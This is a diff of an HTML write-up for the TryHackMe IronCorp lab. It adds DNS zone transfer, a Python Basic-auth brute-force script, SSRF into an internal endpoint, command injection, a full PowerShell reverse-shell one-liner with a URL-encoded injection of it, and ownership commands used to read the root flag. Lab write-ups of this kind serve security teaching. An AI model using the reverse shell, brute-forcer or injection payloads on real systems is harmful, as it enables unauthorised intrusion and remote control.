@@ -7,22 +7,22 @@
     <link rel="stylesheet" href="../../../assets/css/writeup.css">
     <link rel="stylesheet" href="../../../assets/css/global.css">
     <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
 
-    <script src="../../../assets/js/terminal.js" defer></script>
     <script src="../../../assets/js/footer.js" defer></script>
     <script src="../../../assets/js/zoomer.js" defer></script>
 </head>
 <body>
-    <!--This file is a template file and should therefor not be taken seriously-->
     <nav>
         <div class="terminal">
             <span class="prompt">londra@kali $> </span>
             <span class="typed"></span><span class="cursor">_</span>
         </div>
         <div>
-            <a href="">Home</a>
-            <a href="">Writeups</a>
-            <a href="">Contact</a>
+            <a href="../../../index.html">Home</a>
+            <a href="../../../writeuplist.html">Writeups</a>
+            <a href="../../../contact.html">Contact</a>
         </div>
     </nav>
 
@@ -35,7 +35,7 @@
                     <li><strong>Date:</strong> 2026-03-17</li>
                     <li><strong>Platform:</strong> TryHackMe</li>
                     <li><strong>Difficulty:</strong> Hard</li>
-                    <li><strong>Link:</strong> <a href="https://tryhackme.com/room/ironcorp">Open Lab</a></li>
+                    <li><strong>Link:</strong> <a href="https://tryhackme.com/room/ironcorp" target="_blank">Open Lab</a></li>
                     <li><strong>Tags:</strong>
                         <span class="tag">smb</span>
                         <span class="tag">windows</span>
@@ -47,36 +47,189 @@
             <section class="writeup-section">
                 <h2 class="section-title">Reconnaissance</h2>
 
-                <p>Lets first start scanning the target network with nmap</p>
+                <p>Let’s start by scanning the target network with Nmap.</p>
                 <img src="images/nmap1.png" class="lab-image zoomable">
 
                 <pre><code>└─$ sudo nmap -p- ironcorp.me -Pn</code></pre>
 
-                <p>This shows us 7 open ports.<br>
-                Next, the version scan, we want to know what exactly is running on the ports
+                <p>This shows 7 open ports.<br>
+                Next, we run a version scan to identify what is running on those ports.
                 </p>
                 <img src="images/nmap2.png" class="lab-image zoomable">
                 
                 <pre><code>└─$ sudo nmap -p53,135,3389,8080,11025,49668,49670 -sV ironcorp.me -Pn</code></pre>
-
-                <p>
-                    This result strongly indicates that this service is running on a Windows Server (IIS)<br>
-                    We can also see 2 webservers running. One on port <b>8080</b> and one on port <b>11025</b>
-                </p>
             </section>
 
             <section class="writeup-section">
-
-                <h2 class="section-title">Exploitation</h2>
-
-                <img src="ss.png" class="lab-image zoomable">
-
-                <p>
-                The SMB service was vulnerable to EternalBlue which allowed
-                remote code execution through the Metasploit module.
+                <h2 class="section-title">Enumeration</h2>
+                <p>Some interesting ports were found: <b>8080</b>, <b>11025</b> & <b>53</b></p>
+                <p>Although port 3389 (RDP) caught my attention, it was not my initial focus.</p>
+                <p>I inspected the website running on port 8080 and concluded that it is a <br>rabit hole.<br>
+                    It appears to be just a template with no backend functionality.
                 </p>
 
+                <p>I then checked the service on port 11025, which also turned out to be just a frontend.<br>
+                    I performed directory enumeration with Gobuster on both ports but found nothing useful.<br>
+                </p>
+
+                <p>Next I decided to enumerate the DNS server. I did so by trying a zone transfer.<br>
+                    I used the following command:
+                </p>
+
+                <pre><code>└─$ sudo dig axfr ironcorp.me @10.114.170.40</code></pre>
+
+                <details class="command-explanation">
+                    <summary>What this command does</summary>
+                    <ul>
+                        <li>dig             : DNS query tool</li>
+                        <li>axfr            : zone transfer request</li>
+                        <li>ironcorp.me     : domain you’re querying</li>
+                        <li>@10.112.133.139 : specific DNS server you’re asking</li>
+                    </ul>
+
+                    <p>
+                        A zone transfer (AXFR) requests the entire DNS database of a domain.<br>
+                        Normally: restricted to authorized DNS servers<br>
+                        Misconfigured: anyone can retrieve it, resulting in information disclosure (e.g., hidden subdomains)<br>
+                    </p>
+                </details>
+
+                <p>This is the result:</p>
+
+                <img src="images/dig.png" class="lab-image zoomable">
+                <p>I discovered two new subdomains this way.</p>
+
+                <p>I added both <b>admin.ironcorp.me</b> and <b>internal.ironcorp.me</b> to <b>/etc/hosts</b></p>
+                <p><b>internal.ironcorp.me:11025</b> returned a <i>403: Forbidden</i><br>
+                    This likely indicates that the service is only accessible from the internal network.
+                </p>
+
+                <p><b>However, admin.ironcorp.me:11025 prompted for authentication.</p>
+                <img src="images/loginadmin.png" class="lab-image zoomable">
+
+                <p>I wrote a script to brute-force the admin credentials.</p>
+
+                
+<details class="code-block">
+<summary>Credential Bruteforcer (Python)</summary>
+<pre><code>import base64
+import requests
+
+rockyou = "/usr/share/wordlists/rockyou.txt"
+url = "http://admin.ironcorp.me:11025"
+
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+}
+
+with open(rockyou, "r", encoding="latin-1") as f:
+    for line in f:
+        password = line.strip()
+
+        credentials = f"admin:{password}"
+        encoded_credentials = base64.b64encode(credentials.encode()).decode()
+
+        headers["Authorization"] = f"Basic {encoded_credentials}"
+
+        response = requests.get(url, headers=headers)
+
+        if response.status_code == 200 and "Authentication required!" not in response.text.lower():
+            print(f"[+] Found password: {password}")
+            break
+        else:
+            print(f"[-] Tried password: {password}")
+</code></pre>
+</details>
+            <p>The script ran for about a minute and successfully revealed the password.</p>
+            <img src="images/correctpass.png" class="lab-image zoomable">
+
+
             </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+                
+                <p>After logging in, I landed on a page with a search bar.</p>
+                <img src="images/adminpage.png" class="lab-image zoomable">
+
+                <p>I tested various inputs. At first, nothing stood out.<br>
+                    Then I tried <b>dir</b>, the Windows equivalent of <b>ls -la</b>.<br>
+                    The command took noticeably longer to respond, suggesting that it was being executed. <br>
+                    This indicates a <b>command injection vulnerability</b>.<br>
+
+                    However, spaces were not allowed, meaning only a single argument could be used.<br>
+                    I hosted a web server using Python:
+                </p>
+                <pre><code>└─$ sudo python3 -m http.server 8080</code></pre>
+                <p>I placed a file named shell.ps1 in the web root and entered its URL in the search bar.</p>
+                <span class="path">http://192.168.169.133:8080/shell.ps1</span>
+
+                <p>And with success:</p>
+                <img src="images/fileread.png" class="lab-image zoomable">
+                <p>The server returned the file contents successfully.<br>
+                    This confirms a file inclusion vulnerability, not direct command execution.
+                </p>
+
+                <p>Using this, I accessed:</p>
+                <span class="path">http://192.168.169.133:11025/server-status</span>
+
+                <p>Although normally restricted, it was accessible because the request originated from the server itself.<br>
+                This is a clear case of <b>SSRF</b> (Server-Side Request Forgery).</p>
+
+                <p>I then accessed: <b>http://internal.ironcorp.me:11025</b></p>
+                <p>This revealed a new endpoint: <b>http://internal.ironcorp.me:11025/name.php?name=</b></p>
+
+                <p>Since this service is only accessible internally, I had to use the SSRF vulnerability to interact with it.<br>
+                    After some testing, I injected: <b>|whoami</b>
+                </p>
+                <span class="path">http://internal.ironcorp.me:11025/name.php?name=?name=%7cwhoami</span>
+                <p>And it returned the following:</p>
+                <img src="images/mynameisNT.png" class="lab-image zoomable">
+                <p>This confirmed that commands were being executed as <b>NT AUTHORITY\SYSTEM</b>.<br>
+                    I set up a Netcat listener on port 4444</p>
+                <pre><code>└─$ nc -nvlp 4444</code></pre>
+
+                <p>I then used a PowerShell reverse shell payload.</p>
+                <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
+
+                <p>Because spaces were not allowed, I URL-encoded the payload and injected it via the vulnerable parameter.</p>
+                <span class="path">http://internal.ironcorp.me:11025/name.php?name=http://internal.ironcorp.me:11025/name.php?name=%7cpowershell%20%2DNoP%20%2DNonI%20%2DW%20Hidden%20%2DExec%20Bypass%20%2DCommand%20%22%24client%20%3D%20New%2DObject%20System%2ENet%2ESockets%2ETCPClient%28%27192%2E168%2E169%2E133%27%2C4444%29%3B%24stream%20%3D%20%24client%2EGetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200%2E%2E65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream%2ERead%28%24bytes%2C0%2C%24bytes%2ELength%29%29%20%2Dne%200%29%7B%3B%24data%20%3D%20%28New%2DObject%20%2DTypeName%20System%2EText%2EASCIIEncoding%29%2EGetString%28%24bytes%2C0%2C%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out%2DString%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29%2EPath%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext%2Eencoding%5D%3A%3AASCII%29%2EGetBytes%28%24sendback2%29%3B%24stream%2EWrite%28%24sendbyte%2C0%2C%24sendbyte%2ELength%29%3B%24stream%2EFlush%28%29%7D%3B%24client%2EClose%28%29%22</span>
+            
+                <p>And voila, a reverse shell is born:</p>
+                <img src="images/proofReverseShell.png" class="lab-image zoomable">
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Post-Exploitation</h2>
+                <p>I then searched for the first flag.</p>
+                <img src="images/firstflag.png" class="lab-image zoomable">
+                
+                <p>During enumeration, I discovered a user named SuperAdmin.
+                    This account looked interesting, especially since its directory was not accessible.<br>
+                    I needed to escalate privileges.
+                </p>
+
+                <p>I checked my privileges using:</p>
+                <pre><code>PS C:\> whoami /all</code></pre>
+                <img src="images/whoamiall.png" class="lab-image zoomable">
+
+                <p>The output showed that <b>SeImpersonatePrivilege</b> was enabled.<br>
+                    This allows impersonation of other users, which can be leveraged for privilege escalation.<br>
+                    Based on the previous flag’s location, I assumed the root flag would be on the Desktop:</b>
+                </p>
+                <span class="path">C:\Users\SuperAdmin\Desktop\root.txt</span>
+
+                <p>First, I took ownership of the directory and granted full access.</p>
+                <pre><code>PS C:\Users\SuperAdmin> takeown /f C:\Users\SuperAdmin\Desktop /r /d y</code></pre>
+                <pre><code>PS C:\Users\SuperAdmin> C:\Users\SuperAdmin\Desktop /grant Everyone:F /t</code></pre>
+                <pre><code>PS C:\Users\SuperAdmin> type C:\Users\SuperAdmin\Desktop\root.txt</code></pre>
+
+                <p>My assumption was correct:</p>
+                <img src="images/rootflag.png" class="lab-image zoomable">
+            </section>
+
+            <p>Thank you for reading, I hope you learned something new.</p>
         </article>
     </main>
     
